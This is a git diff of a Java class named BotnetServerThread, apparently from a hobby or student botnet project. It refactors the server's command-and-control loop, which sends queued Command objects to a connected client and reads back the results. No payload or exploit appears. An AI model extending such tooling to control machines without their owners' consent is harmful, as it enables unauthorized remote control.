@@ -3,13 +3,13 @@ import java.io.*;
 
 /**
  * BotnetServer Class:
- * User facing object used to create and send command objects to client for execution
+ * Handles communication between client and server as a subsection of the server
  */
 public class BotnetServerThread extends Thread{
     // Properties
     private Socket socket;
     private CommandQueue queue;
-    private Boolean status = true;
+    
 
     //Constructor
     public BotnetServerThread(Socket socket){
@@ -17,111 +17,50 @@ public class BotnetServerThread extends Thread{
         this.socket = socket;
     }
 
-
+    // getter
     public CommandQueue returnQueue(){
         return this.queue;
     }
 
+    //setter
     public void updateQueue(CommandQueue queue){
         this.queue = queue;
     }
 
-    public boolean returnStatus(){
-        return this.status;
-    }
     
-    // public void run() {
-    //     try {
-    //         //input and output streams for the buffer and socket
-    //         ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
-    //         ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
-            
-    //         //**WHILE YOU CAN READ objects FROM THE socket STREAM */
-    //         // while (this.queue != null){
-            
-    //         while(true){
-    //             out.writeObject(this.queue);
-    //             out.flush();
-
-    //             this.queue = (CommandQueue) in.readObject();
-
-    //             // Command inCommand = this.queue.take();
-    //             //Print the response of the command that was processed by the client
-    //             // System.out.println("[+]Client: " + inCommand.getResponse());
-    //             //*If the output is bye close connection */
-    //             // if (inCommand.getResponse().equalsIgnoreCase("exiting")){
-    //             //     System.out.println("[+]Closing connection");
-    //             //     this.status = false;
-    //             //     socket.close();
-    //             //     in.close();
-    //             //     out.close();
-    //             //     System.exit(0);
-    //             //     break;
-    //             // }
-    //             // out.writeObject(this.queue);
-
-    //         }
-            
-    //         // }
-    //         //*CLOSE CONNECTION IF YOU ARE DONE */
-    //         // socket.close();
-    //         // in.close();
-    //         // out.close();
-
-    //     //Error handle for if the class is not found or if there is an IO interuption
-    //     } catch (ClassNotFoundException e){
-    //         System.err.println("[-]IMClient Class not found");
-    //         System.exit(1);
-    //     }
-    //     catch(SocketException e){
-    //         System.err.println("[-]Client disconnected");
-    //         // return null;
-    //     }
-    //      catch (IOException e) {
-    //         e.printStackTrace();
-    //     }
-    //     // return this.queue;
-    // }
-    
+    /**
+     * processQueue: method used to process the queue contained within the server thread
+     * takes out the first command from the queue, sends it to the client for processing, reads it back, and adds it back to the queue
+     */
     public void processQueue() {
+        //get the in and out streams
         try (ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
              ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {
-            
-            // while (true) {
+            //if there is a queue
             if(this.queue != null){
-                // while(true){
-                    try {
-                        for(Command command = this.queue.take(); !command.isFinished(); command = this.queue.take()){
-                            this.queue.status_of_queue();
-                            out.writeObject(command);
-                            // out.flush();
-        
-                            Command inCommand = (Command) in.readObject();
-                            // System.out.println(inCommand.getResponse());
-                            this.queue.put(inCommand);
-                        }
-                        // Command command = this.queue.take();
-                        
-                        // this.queue = (CommandQueue) in.readObject();
-                    } catch (EOFException e) {
-                        System.err.println("[-] Client closed the connection.");
-                        // break;
-                    }
+                //take the first command
+                Command command = this.queue.take();
+                //write it to the client
+                out.writeObject(command);
+                out.flush();
 
-
-                // }
-            // }
+                //read it back from the client
+                Command inCommand = (Command) in.readObject();
+                //put the command back into the queue
+                this.queue.putBack(inCommand);
+                    
             }
-    
-        } catch (ClassNotFoundException | IOException e) {
+        //catch errors
+        }catch (EOFException e) {
+            System.err.println("[-] Client closed the connection.");
+        }catch (ClassNotFoundException | IOException e) {
             e.printStackTrace();
         }
-        
-        }
+    }
     
-
+    //run method of the thread
     public void run(CommandQueue command) {
-        while (status) {
+        while (true) {
             processQueue();
         }
     }
